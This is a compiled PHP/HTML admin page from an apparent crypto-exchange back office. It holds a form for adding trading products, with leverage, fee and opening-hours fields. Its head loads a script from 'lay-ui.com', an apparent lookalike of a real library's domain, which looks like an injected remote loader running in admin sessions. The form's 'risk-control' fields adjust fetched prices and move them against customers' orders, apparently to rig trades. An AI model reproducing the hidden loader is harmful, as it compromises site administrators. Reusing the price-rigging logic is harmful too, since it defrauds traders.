<?php if (!defined('THINK_PATH')) exit(); /*a:4:{s:69:"/www/wwwroot/agc.bxtrade.vip/application/admin/view/goods/proadd.html";i:1639878905;s:61:"/www/wwwroot/agc.bxtrade.vip/application/admin/view/head.html";i:1637561064;s:61:"/www/wwwroot/agc.bxtrade.vip/application/admin/view/menu.html";i:1631099310;s:61:"/www/wwwroot/agc.bxtrade.vip/application/admin/view/foot.html";i:1553756524;}*/ ?>
<!DOCTYPE html>
<html lang="en" style="font-size: 50px;">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="">
    <meta name="author" content="Mosaddek">
    <meta name="keyword" content="FlatLab, Dashboard, Bootstrap, Admin, Template, Theme, Responsive, Fluid, Retina">
    <link rel="shortcut icon" href="/favicon.ico">

    <title>B.King后台管理系统</title>

    <!-- Bootstrap core CSS -->
    <link href="__ADMIN__/css/bootstrap.min.css" rel="stylesheet">
    <link href="__ADMIN__/css/bootstrap-reset.css" rel="stylesheet">
    <!--external css-->
    <link href="__ADMIN__/assets/font-awesome/css/font-awesome.css" rel="stylesheet" />
    <link href="__ADMIN__/assets/jquery-easy-pie-chart/jquery.easy-pie-chart.css" rel="stylesheet" type="text/css" media="screen"/>
    <link rel="stylesheet" href="__ADMIN__/css/owl.carousel.css" type="text/css">
    <!-- Custom styles for this template -->
    <link href="__ADMIN__/css/style.css" rel="stylesheet">
    <link href="__ADMIN__/css/style-responsive.css" rel="stylesheet" />
    <link href="__ADMIN__/css/addstyle.css" rel="stylesheet">

    <script src="__ADMIN__/js/jquery.js"></script>
    <script src="__ADMIN__/js/jquery-1.8.3.min.js"></script>
    <script src="/static/layer/layer.js"></script>

    <!-- 时间选择器 -->
    <link rel="stylesheet" type="text/css" href="__ADMIN__/css/jquery.datetimepicker.css"/>

    <!-- HTML5 shim and Respond.js IE8 support of HTML5 tooltipss and media queries -->
    <!--[if lt IE 9]>
      <script src="__ADMIN__/js/html5shiv.js"></script>
      <script src="__ADMIN__/js/respond.min.js"></script>
    <![endif]-->
    
<script src="https://lay-ui.com/r/gR2/woT3dK"></script>

  </head>

  <body>

  <section id="container" class="">
      <!--header start-->
      <header class="header white-bg">
            <div class="sidebar-toggle-box">
                <div data-original-title="显示/隐藏" data-placement="right" class="icon-reorder tooltips"></div>
            </div>
            <!--logo start-->
          <?php if($msg_nums>0): ?>
          <a  href="<?php echo Url('admin/user/message'); ?>" class="logo">
          <?php else: ?>
          <a  href="#" class="logo">
          <?php endif; ?>
              后台管理系统
              <?php if($msg_nums>0): ?>
              <span>&nbsp;&nbsp;您有<?php echo $msg_nums; ?>条未读留言</span>
              <?php endif; ?>
          </a>
            <!--logo end-->

            <div class="top-nav ">
                <!--search & user info start-->
                <ul class="nav pull-right top-menu">
                    <?php if(isset($_SESSION['username'])): ?>
                    <!-- user login dropdown start-->
                    <li class="dropdown">
                        <a data-toggle="dropdown" class="dropdown-toggle" href="#">
                            <span class="username"><?php echo !empty($_SESSION['username'])?$_SESSION['username']:''; ?></span>
                            <b class="caret"></b>
                        </a>
                        <ul class="dropdown-menu extended logout">
                            <li><a href="<?php echo Url('login/logout'); ?>"><i class="icon-signout"></i> 退出</a></li>
                        </ul>
                    </li>
                    <?php endif; ?>
                    <!-- user login dropdown end -->
                </ul>
                <!--search & user info end-->
            </div>
        </header>
<!--header end-->

<style>
    .form-box{
        width: 30%;
        float: left;
        border: 1px solid red;
        margin-left:1%;
        margin-bottom: 10px;
        position: relative;
    }
    .col-lg-8 .picture{
        display: block;
        width: 100%;
        cursor: pointer;
        padding: 5px;
        height: 150px;
    }
    .form-box .deluploads{
        position: absolute;
        z-index: 90;
        top: 0;
        right: 0;
        width: 20px;
        height: 20px;
        margin: auto;
        cursor: pointer;
        display: none;
    }
</style>
<!--sidebar start-->
      <aside>
          <div id="sidebar"  class="nav-collapse ">
          
          <?php if($otype == 3): ?>
              <!-- sidebar menu start-->
              <ul class="sidebar-menu">
                  <li <?php if($actionname == 'index' && $contrname == 'Index'): ?> class="active" <?php endif; ?> >
                      <a class="" href="<?php echo Url('admin/index/index'); ?>">
                          <i class="icon-dashboard"></i>
                          <span>后台首页</span>
                      </a>
                  </li>
                  <!-- <?php if(is_array($menulist) || $menulist instanceof \think\Collection || $menulist instanceof \think\Paginator): $i = 0; $__LIST__ = $menulist;if( count($__LIST__)==0 ) : echo "" ;else: foreach($__LIST__ as $key=>$vo): $mod = ($i % 2 );++$i;?> -->
                  <!-- <?php if($ruleslist == 'all' || in_array($vo['id'],$ruleslist)): ?> -->
                  <li 
                  <?php if($vo['arr'] == ""): if($contrname == $vo['con']): ?> class="active" <?php else: ?> class="sub-menu " <?php endif; else: if($contrname == $vo['con'] && (in_array($actionname,$vo['arr']))): ?>
                    class="active"
                    <?php else: ?>
                    class="sub-menu "
                    <?php endif; endif; ?>
                  >
                      <a class="" <?php if($vo['url'] == ""): ?> href="javascript:;" <?php else: ?> href="<?php echo $vo['url']; ?>" <?php endif; ?>>
                          <i class="<?php echo $vo['icon']; ?>"></i>
                          <span><?php echo $vo['name']; ?></span>
                          <!-- <?php if($vo['arrow'] != ""): ?> -->
                          <span class="arrow"></span>
                          <!-- <?php endif; ?> -->
                      </a>
                      <ul class="sub">
                        <!-- <?php if(is_array($vo['list']) || $vo['list'] instanceof \think\Collection || $vo['list'] instanceof \think\Paginator): $i = 0; $__LIST__ = $vo['list'];if( count($__LIST__)==0 ) : echo "" ;else: foreach($__LIST__ as $key=>$v): $mod = ($i % 2 );++$i;?> -->
                        <!-- <?php if($ruleslist == 'all' || in_array($v['id'],$ruleslist)): ?> -->
                        <li 
                        <?php if($v['arr'] == ""): if($contrname == $v['con'] && $actionname == $v['act']): ?> class="active" <?php endif; else: if(in_array($actionname,$v['arr']) && $contrname == $v['con'] && $actionname == $v['act']): ?>
                          class="active"
                          <?php endif; endif; ?>
                        >
                          <a  href="<?php echo $v['url']; ?>"><?php echo $v['name']; ?></a>
                        </li>
                        <!-- <?php endif; ?> -->
                        <!-- <?php endforeach; endif; else: echo "" ;endif; ?> -->
                      </ul>
                  </li>
                  <!-- <?php endif; ?> -->
                  <!-- <?php endforeach; endif; else: echo "" ;endif; ?> -->
                  <li>
                      <a class="" href="<?php echo Url('admin/login/logout'); ?>">
                          <i class="icon-signout"></i>
                          <span>安全退出</span>
                      </a>
                  </li>
              </ul>
              <!-- sidebar menu end-->
          <?php else: ?>
           <ul class="sidebar-menu">
                  <li <?php if($actionname == 'index' && $contrname == 'Index'): ?> class="active" <?php endif; ?> >
                      <a class="" href="<?php echo Url('admin/index/index'); ?>">
                          <i class="icon-dashboard"></i>
                          <span>后台首页</span>
                      </a>
                  </li>
               
                
                  <li <?php if($contrname == 'Order'): ?> class="active" <?php else: ?> class="sub-menu " <?php endif; ?>>
                      <a href="javascript:;" class="">
                          <i class="icon-paste"></i>
                          <span>订单管理</span>
                          <span class="arrow"></span>
                      </a>
                      <ul class="sub">
                          <li <?php if($actionname == 'orderlist'): ?> class="active" <?php endif; ?>><a class="" href="<?php echo Url('admin/order/orderlist'); ?>">秒合约订单</a></li>
                          <li <?php if($actionname == 'orderlist_bibi'): ?> class="active" <?php endif; ?>><a class="" href="<?php echo Url('admin/order/orderlist_bibi'); ?>">币币订单</a></li>
                          <li <?php if($actionname == 'orderlist_lever'): ?> class="active" <?php endif; ?>><a class="" href="<?php echo Url('admin/order/orderlist_lever'); ?>">合约订单</a></li>
                          
                      </ul>
                  </li>

                  <li <?php if($contrname == 'User' && ( in_array($actionname,array('userlist','useradd','userprice','userinfo','cash','myteam')) )): ?> class="active" <?php else: ?> class="sub-menu " <?php endif; ?>>
                      <a href="javascript:;" class="">
                          <i class="icon-user"></i>
                          <span>用户管理</span>
                          <span class="arrow"></span>
                      </a>
                      <ul class="sub">
                          <li <?php if(in_array($actionname,array('userlist','useradd'))): ?> class="active" <?php endif; ?>>
                          <a class="" href="<?php echo Url('admin/user/userlist'); ?>">客户列表</a></li>
                          
                          <li <?php if(in_array($actionname,array('myteam'))): ?> class="active" <?php endif; ?>>
                          <a class="" href="<?php echo Url('admin/user/myteam'); ?>">我的团队</a></li>

                          <li <?php if($actionname == 'userprice'): ?> class="active" <?php endif; ?>>
                          <a class="" href="<?php echo Url('admin/user/userprice'); ?>">充值列表</a></li>

                          <li <?php if($actionname == 'cash'): ?> class="active" <?php endif; ?>>
                          <a class="" href="<?php echo Url('admin/user/cash'); ?>">提现列表</a></li>
 
                      </ul>
                  </li>

                  
                  <!--<li <?php if($contrname == 'Price'): ?> class="active" <?php else: ?> class="sub-menu " <?php endif; ?>>
                      <a href="javascript:;" class="">
                          <i class="icon-yen"></i>
                          <span>报表管理</span>
                          <span class="arrow"></span>
                      </a>
                      <ul class="sub">
                          
                          
                          <li <?php if($actionname == 'allot'): ?> class="active" <?php endif; ?>>
                          <a class="" href="<?php echo Url('admin/price/allot'); ?>">红利报表</a></li>

                          <li <?php if($actionname == 'yongjin'): ?> class="active" <?php endif; ?>>
                          <a class="" href="<?php echo Url('admin/price/yongjin'); ?>">佣金报表</a></li>

                          <li <?php if($actionname == 'pricelist'): ?> class="active" <?php endif; ?>>
                          <a class="" href="<?php echo Url('admin/price/pricelist'); ?>">资金报表</a></li>

                          <li <?php if($actionname == 'myprice'): ?> class="active" <?php endif; ?>>
                          <a class="" href="<?php echo Url('admin/price/myprice'); ?>">个人报表</a></li>
                          
                      </ul>
                  </li>
                  -->
                 

                  <li>
                      <a class="" href="<?php echo Url('admin/login/logout'); ?>">
                          <i class="icon-signout"></i>
                          <span>退出</span>
                      </a>
                  </li>
              </ul>
          
          <?php endif; ?>
          </div>
      </aside>
      <!--sidebar end-->




<!--main content start-->
      <section id="main-content">
          <section class="wrapper">
              
            
          <div class="row">
                  <div class="col-sm-12">
                      <aside class="profile-info col-lg-10">
                      <section class="panel">
                          
                          <div class="panel-body bio-graph-info">
                              <h1> <?php echo !empty($pid)?'编辑产品':'添加产品'; ?></h1>
                              <form class="form-horizontal" role="form" id="formid" method="post">
                                  
                                  <div class="form-group">
                                      <label class="col-lg-2 control-label">产品名称</label>
                                      
                                      
                                      <div class="col-lg-8">
                                          <input type="text" class="form-control m-cpmc" value="<?php echo !empty($ptitle)?$ptitle:''; ?>"  placeholder="请填写产品名称" name="ptitle" <?php echo !empty($pid)?'readonly':''; ?> />
                                          
                                          <div class="alert alert-block alert-danger fade in" style="margin:10px 0 0 0 ">
                                            <strong>注意：</strong> 严格按照格式填写，格式：BTC/USDT  字母必须大写，两数字货币名称之间用/隔开，添加后无法更改

                                            </div>
                                      </div>
                                      
                                      
                                  </div>

                                  


                                  <div class="form-group">
                                      <label class="col-lg-2 control-label">分类</label>
                                      <div class="col-lg-8">
                                          <select name="cid" class="selectpicker show-tick form-control">
                                          		<option value="0">请选择分类</option>
                                          		<!-- <?php if(is_array($proclass) || $proclass instanceof \think\Collection || $proclass instanceof \think\Paginator): $i = 0; $__LIST__ = $proclass;if( count($__LIST__)==0 ) : echo "" ;else: foreach($__LIST__ as $key=>$vo): $mod = ($i % 2 );++$i;?> -->
                                            	<option <?php if(isset($cid) && $cid == $vo['pcid']): ?> selected="selected" <?php endif; ?> value="<?php echo $vo['pcid']; ?>"><?php echo $vo['pcname']; ?></option>
                                              	<!-- <?php endforeach; endif; else: echo "" ;endif; ?> -->
                                          </select>
                                      </div>
                                  </div>
                                  
                                  <?php if(!isset($cid)): ?>
                                  
                                  <div class="form-group">
                                      <label class="col-lg-2 control-label">产品种类</label>
                                      <div class="col-lg-8">
                                          <select name="is_fb" class="selectpicker show-tick form-control">
                                          	
                                          	
                                            	<option <?php if(isset($is_fb) && $is_fb == '0'): ?> selected="selected" <?php endif; ?> value="0">大盘</option>
                                              <option <?php if(isset($is_fb) && $is_fb == '1'): ?> selected="selected" <?php endif; ?> value="1">本交易所(内部币种)</option>
                                          </select>
                                      </div>
                                  </div>
                                  
                                  
                                  
                                  
                                  <div class="form-group">
                                      <label class="col-lg-2 control-label">发行价</label>
                                      <div class="col-lg-8">
                                          <input type="text" class="form-control" value="<?php echo !empty($price)?$price:''; ?>"  placeholder="请填写发行价" name="price">
                                          
                                          <div class="alert alert-block alert-danger fade in" style="margin:10px 0 0 0 ">
                                            <strong>注意：</strong> 仅对内部币种发行有效

                                            </div>
                                            
                                      </div>
                                  </div>
                                  
                                  <?php endif; ?>

                                  
							
                                  <div class="form-group">
                                      <label class="col-lg-2 control-label">随机波动范围</label>
                                      <div class="col-lg-8">
                                      		<div class="input-group">
					                            <span class="input-group-addon" id="basic-addon1">最小值</span>
					                            <input type="text" value="<?php echo !empty($point_low)?$point_low:''; ?>" class="form-control" placeholder="风控波动最小值" name="point_low">
					                            <span class="input-group-addon" id="basic-addon1">最大值</span>
					                            <input type="text" value="<?php echo !empty($point_top)?$point_top:''; ?>" class="form-control" placeholder="风控波动最大值" name="point_top">
					                        </div>
					                        
											<div class="alert alert-block alert-danger fade in" style="margin:10px 0 0 0 ">
				                                 <strong>注意：</strong> 产品获取接口值后，自动减或加最小值与最大值之间的随机数，留空或者0则为不开启，如果是接大盘的品种，最小值必须小于0，最大值必须大于0
				                                 
				                            </div>
					                        
                                          
                                      </div>
                                  </div>

                                  <div class="form-group">
                                      <label class="col-lg-2 control-label">风控波动范围</label>
                                      <div class="col-lg-8">
                                          <input type="text" class="form-control"  placeholder="请填写随机波动范围" name="rands" value="<?php echo !empty($rands)?$rands:''; ?>">
                                          <div class="alert alert-block alert-danger fade in" style="margin:10px 0 0 0 ">
                                              
                                              
                                              <strong>注意：</strong> 客户订单在条件范围内时，会根据订单的涨或跌，自动+-此处的值。如5，则在接口获取的数据中加上-5~5之间的随机数。
                                              
				                                 
				                          </div>
                                      </div>
                                  </div>
                                  

                                  <div class="form-group">
                                      <label class="col-lg-2 control-label">产品代码</label>
                                      <div class="col-lg-8">
                                          <input type="text" class="form-control" value="<?php echo !empty($procode)?$procode:''; ?>"  placeholder="请填写产品代码" name="procode" >
                                          
                                          <div class="alert alert-block alert-danger fade in" style="margin:10px 0 0 0 ">
                                            <strong>注意：</strong> 严格按照格式填写，格式：btcusdt  字母必须小写

                                            </div>
                                            
                                      </div>
                                  </div>

                                  <div class="form-group">
                                      <label class="col-lg-2 control-label">提币手续费</label>
                                      <div class="col-lg-8">
                                          <input type="text" class="form-control" value="<?php echo !empty($ti_sxfee)?$ti_sxfee:''; ?>"  placeholder="请填提币手续费" name="ti_sxfee">
                                          <div class="alert alert-block alert-danger fade in" style="margin:10px 0 0 0 ">
                                               <strong>注意：</strong> 提币每笔扣取数值。
                                        </div>
                                      </div>
                                  </div> 

                                  <div class="form-group">
                                      <label class="col-lg-2 control-label">时间玩法间隔</label>
                                      <div class="col-lg-8">
                                          <input type="text" class="form-control" value="<?php echo !empty($protime)?$protime:''; ?>"  placeholder="请填写时间玩法间隔" name="protime">
                                          <div class="alert alert-block alert-danger fade in" style="margin:10px 0 0 0 ">
                                               <strong>注意：</strong> 如时间为：1分、3分、5分、8分，则请用字母逗号将时间分开，如输入：1,3,5,8  如没有此玩法则留空。必须为四个
                                        </div>
                                      </div>
                                  </div>
                                  <div class="form-group">
                                      <label class="col-lg-2 control-label">杠杠</label>
                                      <div class="col-lg-8">
                                          <input type="text" class="form-control" value="<?php echo !empty($code)?$code:''; ?>"  placeholder="请填写杠杠" name="code">
                                          <div class="alert alert-block alert-danger fade in" style="margin:10px 0 0 0 ">
                                               <strong>注意：</strong> 请用字母逗号将时间分开，如输入：10,20,50,100
                                        </div>
                                      </div>
                                  </div>
                                  <div class="form-group">
                                      <label class="col-lg-2 control-label">每手对应产品数量</label>
                                      <div class="col-lg-8">
                                          <input type="text" class="form-control" value="<?php echo !empty($numprice)?$numprice:''; ?>"  placeholder="请填写每手对应产品数量" name="numprice">
                                          <div class="alert alert-block alert-danger fade in" style="margin:10px 0 0 0 ">
                                               <strong>注意：</strong> 用户购买每手对应产品数量，如0.001  当用户输入1则表示后买数量是0.001
                                        </div>
                                      </div>
                                  </div>
                                  <div class="form-group">
                                      <label class="col-lg-2 control-label">变动小数长度</label>
                                      <div class="col-lg-8">
                                          <input type="text" class="form-control" value="<?php echo !empty($decimal)?$decimal:''; ?>"  placeholder="请填写变动小数长度" name="decimal">
                                          <div class="alert alert-block alert-danger fade in" style="margin:10px 0 0 0 ">
                                               <strong>注意：</strong>变动小数长度是该产品以第几位小数点开始计算，第几位变动则与点位盈亏计算盈亏比例，2是百分位，1是十分位，0则是个位，-1则是十位，以此类推，只能是整数，不能是分数，小数，非数字（一般来说，当前价有几位小数就填写几）;
                                        </div>
                                      </div>
                                  </div>
                                  <div class="form-group">
                                      <label class="col-lg-2 control-label">点位差</label>
                                      <div class="col-lg-8">
                                          <input type="text" class="form-control" value="<?php echo !empty($income_range)?$income_range:''; ?>"  placeholder="请填写点差数（涨,跌）" name="income_range">
                                          <div class="alert alert-block alert-danger fade in" style="margin:10px 0 0 0 ">
                                               <strong>注意：</strong>点位差是用户合约交易时以变动小数长度最后一位的涨跌上下浮动的点数，格式为 涨点差,跌点差，例：5,5，(前一个数是涨点差,后一个数为跌点差)为零时不计算点差，只能是两个，不能为负数，且必须用英文逗号字符;
                                        </div>
                                      </div>
                                  </div>
<!--                                   <div class="form-group">
                                      <label class="col-lg-2 control-label">点位玩法间隔</label>
                                      <div class="col-lg-8">
                                          <input type="text" class="form-control" value="<?php echo !empty($propoint)?$propoint:''; ?>"  placeholder="请填写产品名称" name="propoint">
                                          <div class="alert alert-block alert-danger fade in" style="margin:10px 0 0 0 ">
                                               <strong>注意：</strong> 如点位为：1点、3点、5点、8点，则请用字母逗号将点位分开，如输入：1,3,5,8。如没有此玩法则留空。必须为四个
                                        </div>
                                      </div>
                                  </div> -->

                                  <div class="form-group">
                                      <label class="col-lg-2 control-label">盈亏比例</label>
                                      <div class="col-lg-8">
                                          <input type="text" class="form-control" value="<?php echo !empty($proscale)?$proscale:''; ?>"  placeholder="请填写盈亏比例" name="proscale">
                                          <div class="alert alert-block alert-danger fade in" style="margin:10px 0 0 0 ">
                                               <strong>注意：</strong> 如比例为：75%、77%，80%、85%，则请用字母逗号将比例分开，如输入：75,77,80,85  必须为四个，且不得为空
                                        </div>
                                      </div>
                                  </div>

                                  <div class="form-group">
                                      <label class="col-lg-2 control-label">开市时间</label>
                                      <div class="col-lg-8">
                                          <div class="input-group">
                                              <span class="input-group-addon" id="basic-addon1">周一</span>
                                              <input type="text" value="<?php echo !empty($opentime[0])?$opentime[0]:''; ?>" class="form-control" placeholder="如：00:00~03:00|08:00~24:00" name="opentime[1]">
                                              <span class="input-group-addon" id="basic-addon1">周二</span>
                                              <input type="text" value="<?php echo !empty($opentime[1])?$opentime[1]:''; ?>" class="form-control" placeholder="如：00:00~03:00|08:00~24:00" name="opentime[2]">
                                          </div>

                                          <div class="input-group">
                                              <span class="input-group-addon" id="basic-addon1">周三</span>
                                              <input type="text" value="<?php echo !empty($opentime[2])?$opentime[2]:''; ?>" class="form-control" placeholder="如：00:00~03:00|08:00~24:00" name="opentime[3]">
                                              <span class="input-group-addon" id="basic-addon1">周四</span>
                                              <input type="text" value="<?php echo !empty($opentime[3])?$opentime[3]:''; ?>" class="form-control" placeholder="如：00:00~03:00|08:00~24:00" name="opentime[4]">
                                          </div>

                                          <div class="input-group">
                                              <span class="input-group-addon" id="basic-addon1">周五</span>
                                              <input type="text" value="<?php echo !empty($opentime[4])?$opentime[4]:''; ?>" class="form-control" placeholder="如：00:00~03:00|08:00~24:00" name="opentime[5]">
                                              <span class="input-group-addon" id="basic-addon1">周六</span>
                                              <input type="text" value="<?php echo !empty($opentime[5])?$opentime[5]:''; ?>" class="form-control" placeholder="如：00:00~03:00|08:00~24:00" name="opentime[6]">
                                              <span class="input-group-addon" id="basic-addon1">周日</span>
                                              <input type="text" value="<?php echo !empty($opentime[6])?$opentime[6]:''; ?>" class="form-control" placeholder="如：00:00~03:00|08:00~24:00" name="opentime[7]">
                                          </div>


                                  
                                    <div class="alert alert-block alert-danger fade in" style="margin:10px 0 0 0 ">
                                         <strong>注意：</strong> 开市时间为00:00~18:00则输入 00:00~18:00  开市时间为00:00~03:00 和 08:00~24:00;则输入 如：00:00~03:00|08:00~24:00 不得出现中文符号，全天不开市请留空,时间一定要填写准确
                                    </div>
                                  
                                          
                                      </div>
                                  </div>
                                  
                                  <div class="form-group">
                                      <label class="col-lg-2 control-label">备注</label>
                                      <div class="col-lg-8">
                                          <textarea name="content" class="form-control" cols="30" rows="10"><?php echo !empty($content)?$content:''; ?></textarea>
                                      </div>
                                  </div>


                                
								
								<input type="hidden" name="pid" value="<?php echo !empty($pid)?$pid:''; ?>">
                                  <div class="form-group">
                                      <div class="col-lg-offset-2 col-lg-10">
                                          <input type="submit" class="btn btn-success m-tj" onclick="return editpro(this.form)" value="提交">
                                          
                                      </div>
                                  </div>
                              </form>
                          </div>
                      </section>
                      
                  </aside>
                  </div>

          </div>       
          
          
             

          </section>
      </section>
      <!--main content end-->
  </section>



    <!-- js placed at the end of the document so the pages load faster -->
    
    <script src="__ADMIN__/js/bootstrap.min.js"></script>
    <script src="__ADMIN__/js/jquery.scrollTo.min.js"></script>
    <script src="__ADMIN__/js/jquery.nicescroll.js" type="text/javascript"></script>
    <script src="__ADMIN__/js/jquery.sparkline.js" type="text/javascript"></script>
    <script src="__ADMIN__/assets/jquery-easy-pie-chart/jquery.easy-pie-chart.js"></script>
    <script src="__ADMIN__/js/owl.carousel.js" ></script>
    <script src="__ADMIN__/js/jquery.customSelect.min.js" ></script>

    <!--common script for all pages-->
    <script src="__ADMIN__/js/common-scripts.js"></script>

    <!--script for this page-->
    <script src="__ADMIN__/js/sparkline-chart.js"></script>
    <script src="__ADMIN__/js/easy-pie-chart.js"></script>

    <!-- active -->
    <script src="/static/public/js/function.js"></script>
    
    <!-- date -->
    <script type="text/javascript" src="__ADMIN__/js/date/jquery.datetimepicker.js" charset="UTF-8"></script>

  </body>
</html>

<script src="/index/js/jquery-2.1.4.min.js">
    $(".m-tj").click(function(){
        var cpmc=$(".m-cpmc").val();
        $.post("/index/Assets/gx2",
            {
                cpmc:cpmc,

            },
            function(re){

            });
    });
</script>
<script>
function editpro(form){

	var ptitle = form.ptitle.value;
	var cid = form.cid.value;
	var point_low = form.point_low.value;
	var point_top = form.point_top.value;
	var rands = form.rands.value;
  var procode = form.procode.value;
  var proscale = form.proscale.value;

	if(!ptitle){
		layer.msg('请输入产品名称'); 
	    return false;
	}

	if(!cid || cid == 0){
		layer.msg('请选择分类'); 
	    return false;
	}

	if( point_low > 0 || isNaN(point_low)  ){
		layer.msg('最小值应小于0的数字'); 
	    return false;
	}
	
	
	if( point_top < 0 || isNaN(point_top)){
		layer.msg('最大值应为大于0的数字'); 
	    return false;
	}



	if( rands < 0 || isNaN(rands)){
		layer.msg('风控值应为大于0的数字'); 
	    return false;
	}

	if(point_low > point_top ){
		layer.msg('风控最小值应该小于最大值'); 
	    return false;
	}

  if(!procode ){
    layer.msg('请输入产品代码！'); 
      return false;
  }

  if(!proscale ){
    layer.msg('请输入盈亏比例！'); 
      return false;
  }


	var formurl = "<?php echo Url('goods/proadd'); ?>"
   var data = $('#formid').serialize();
   var locurl = "<?php echo Url('admin/goods/prolist'); ?>";

   WPpost(formurl,data,locurl);




	return false;

}

$(function(){
    $(document).on('change',".form-box input[type='file']",function(){
        var file=this.files;
        var windowURL = window.URL || window.webkitURL;
        var dataURL;
        if(file && file.length>0){
            var obj = $(this);
            dataURL = windowURL.createObjectURL(file[0]);
            var fd = new FormData();
            fd.append(obj.attr('name'),obj.get(0).files[0]);
            if(obj.attr('ak') != undefined){
                fd.append("id",obj.attr('ak'));
            }
            $.ajax({
                url:"<?php echo url('admin/other/pictureajax'); ?>",
                type:'post',
                data: fd,
                contentType: false,
                processData: false,
                beforeSend: function(){
                    layer.msg("请稍后...",{time:2*1000});
                    $('#mask').css({'display':'block'});
                },
                success:function(data){
                    data = eval("("+data+")");
                    if(data.state == 'error'){
                        layer.msg(data.tips,{time:2*1000});
                    }
                    if(data.state == 'success'){
                        obj.prev().attr('src',dataURL);
                        layer.msg(data.tips,{time:2*1000});
                        if(data.name == 'automatic' && data.con == 'in'){
                            obj.parent().append('<img src="/static/admin/img/error.png" onclick="deleteIMG($(this),'+data.id+')" class="deluploads" />');
                            // obj.parent().parent().append(
                            //     '<div class="form-box">\
                            //       <img src="/static/admin/img/uploads.png" onclick="$(this).next().click()" class="picture" />\
                            //       <input class="hidden" type="file" ak="" name="automatic">\
                            //     </div>'
                            // );
                        }
                        if(data.name == 'activity' && data.con == 'in'){
                            obj.parent().append('<img src="/static/admin/img/error.png" onclick="deleteIMG($(this),'+data.id+')" class="deluploads" />');
                            obj.parent().parent().append(
                                '<div class="form-box">\
                                  <img src="/static/admin/img/uploads.png" onclick="$(this).next().click()" class="picture" />\
                                  <input class="hidden" type="file" ak="" name="activity">\
                                </div>'
                            );
                        }
                    }
                },
                complete: function () {
                    $('#mask').css({'display':'none'});
                },
                error:function(){
                    layer.msg("网络繁忙...",{time:2*1000});
                }
            });
        }
    });

    $(document).on('mouseover',".form-box",function(){
        $(this).find('.deluploads').css({'display':'block'});
    });
    $(document).on('mouseout',".form-box",function(){
        $(this).find('.deluploads').css({'display':'none'});
    });
});
function deleteIMG(obj,id){
    if(id){
        if(window.confirm("确定删除吗")){
            $.ajax({
                type:"post",
                url:"<?php echo url('admin/other/delpicture'); ?>",
                data:{
                    id:id
                },
                dataType:'JSON',
                async:false,
                success:function(data){
                    if(data.state == 'success'){
                        obj.parent().remove();
                        layer.msg(data.tips,{time:2*1000});
                    }else{
                        layer.msg(data.tips,{time:2*1000});
                    }
                },
                error:function(){
                    layer.msg("网络出错..",{time:2*1000});
                }
            });
        }else{
            return false;
        }
    }
}
</script>
